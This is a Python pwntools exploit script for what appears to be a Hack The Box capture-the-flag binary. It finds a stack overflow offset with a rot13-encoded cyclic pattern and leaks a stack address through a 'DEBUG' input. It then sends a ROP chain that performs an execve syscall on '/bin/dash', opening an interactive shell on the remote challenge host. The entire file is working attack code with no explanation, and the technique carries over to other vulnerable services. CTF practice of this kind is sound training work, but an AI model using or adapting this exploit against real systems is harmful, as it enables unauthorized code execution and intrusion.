import string
import sys
from pwn import *

prog = "./binary"
binsh = "/bin/dash\x00"
context.clear(arch="amd64")


def rot13(pay):
    newpayload = ''
    for i in range(len(pay)):
        if pay[i] in string.ascii_lowercase:
            temp = string.ascii_lowercase[(string.ascii_lowercase.index(pay[i]) + 13) % len(string.ascii_lowercase)]
        elif pay[i] in string.ascii_uppercase:
            temp = string.ascii_uppercase[(string.ascii_uppercase.index(pay[i]) + 13) % len(string.ascii_uppercase)]
        else:
            temp = pay[i]
        newpayload+=temp
    return newpayload

def crash():

    p = process(prog)
    crash = rot13(cyclic(230))
    print(p.recvline())
    
    log.info("Sending payload of %s bytes" % 230)
    p.sendline(crash)
    p.wait()
    
    core = p.corefile
    rsp = core.rsp
    offset = core.read(rsp, 4)
    offset =  cyclic_find(offset)
    log.success("Found offset of %s bytes" % offset)
    return offset

def debug(p):

    payload = "DEBUG"
    print(p.recvline())
    p.sendline(payload)
    leak = p.recvline().replace('I dont know what this is ','')
    return int(leak,16)


def exploit(p,offset,ptr_addr):

    elf = ELF(prog)
    rop = ROP(elf)

    stack_addr = ptr_addr - 224

    rop.raw(rop.find_gadget(['pop rax','ret']).address)
    rop.raw(59)
    rop.call(rop.find_gadget(['syscall']).address,[stack_addr,0,0])
    print(rop.dump())
    print(str(rop))

    payload = rot13(binsh) + "A" * (offset - len(binsh))
    payload += str(rop)

    log.info("Sending payload: %s" % payload)

    print(p.recvuntil("me"))
    p.sendline(payload)
    p.interactive()


def main():

    rip_offset = crash()

    p = remote('docker.hackthebox.eu',sys.argv[1])
    ptr_addr = debug(p)

    exploit(p,rip_offset,ptr_addr)


if     __name__ == "__main__":
        main()
       
   
       
       
       
       
